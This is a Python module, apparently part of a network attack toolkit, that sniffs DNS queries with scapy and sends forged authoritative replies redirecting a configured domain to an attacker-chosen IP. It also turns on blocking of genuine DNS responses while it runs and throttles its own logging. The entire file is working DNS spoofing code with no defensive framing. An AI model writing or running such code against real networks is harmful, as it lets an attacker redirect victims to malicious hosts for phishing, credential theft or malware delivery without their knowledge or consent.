import scapy.all as scapy
from scapy.layers.dns import DNS, DNSQR, DNSRR
import time
from . import STATUS, STOP_EVENT
from .utils import log_msg, set_dns_blocking

# Cooldown tracker to prevent log spam
LOG_COOLDOWN = {} 

def dns_spoofer(packet):
    if STOP_EVENT.is_set(): return
    
    if packet.haslayer(DNS) and packet[DNS].qr == 0:
        try:
            qname = packet[DNSQR].qname.decode('utf-8')
            target_domain = STATUS.get("dns_domain")
            fake_ip = STATUS.get("dns_ip")
            
            if target_domain and target_domain in qname:
                # --- SPAM FILTER LOGIC ---
                current_time = time.time()
                last_log = LOG_COOLDOWN.get(qname, 0)
                
                # Only log if 3 seconds have passed since last log for this domain
                if current_time - last_log > 3:
                    log_msg(f"Trapped DNS: {qname} -> Redirecting to {fake_ip}")
                    LOG_COOLDOWN[qname] = current_time
                # -------------------------

                scapy_ip = scapy.IP(src=packet[scapy.IP].dst, dst=packet[scapy.IP].src)
                scapy_udp = scapy.UDP(sport=packet[scapy.UDP].dport, dport=packet[scapy.UDP].sport)
                
                scapy_dns = scapy.DNS(
                    id=packet[scapy.DNS].id, qr=1, aa=1, 
                    qd=packet[scapy.DNS].qd, 
                    an=scapy.DNSRR(rrname=packet[DNSQR].qname, ttl=10, rdata=fake_ip)
                )
                
                spoofed_pkt = scapy_ip / scapy_udp / scapy_dns
                
                del spoofed_pkt[scapy.IP].len
                del spoofed_pkt[scapy.IP].chksum
                del spoofed_pkt[scapy.UDP].len
                del spoofed_pkt[scapy.UDP].chksum
                
                scapy.send(spoofed_pkt, verbose=False, iface=STATUS["interface"])
                # Removed "Sent DNS Reply" log entirely to reduce noise
        except: pass

def start_dns_spoofing():
    try:
        set_dns_blocking(True) 
        scapy.sniff(filter="udp port 53", prn=dns_spoofer, iface=STATUS["interface"], stop_filter=lambda x: STOP_EVENT.is_set())
    finally:
        set_dns_blocking(False)